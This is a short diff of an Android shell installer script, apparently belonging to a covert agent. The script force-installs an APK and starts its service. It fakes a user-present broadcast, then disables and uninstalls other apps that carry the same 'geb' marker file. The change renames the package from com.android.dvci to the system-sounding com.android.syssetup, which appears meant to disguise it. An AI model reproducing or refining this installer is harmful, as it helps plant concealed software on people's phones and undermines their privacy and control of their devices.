@@ -11,17 +11,17 @@ sleep 1
 pm install -r -f /data/local/tmp/adb-tmp.apk
 sleep 2
 
-installed=$(pm list packages com.android.dvci)
+installed=$(pm list packages com.android.syssetup)
 if [ ${#installed} -gt 0 ]; then
 	# correctly installed
-	am startservice com.android.dvci/.ServiceMain
+	am startservice com.android.syssetup/.SMain
 	am broadcast -a android.intent.action.USER_PRESENT
 
 	for geb in $(ls /data/data/*/files/geb); do
 		init=${geb#/data/data/}
 	    package=${init%%/*}
 
-	    if [ "$package" != "com.android.dvci" ]; then
+	    if [ "$package" != "com.android.syssetup" ]; then
 		    pm disable $package
 		    pm uninstall $package
 		fi
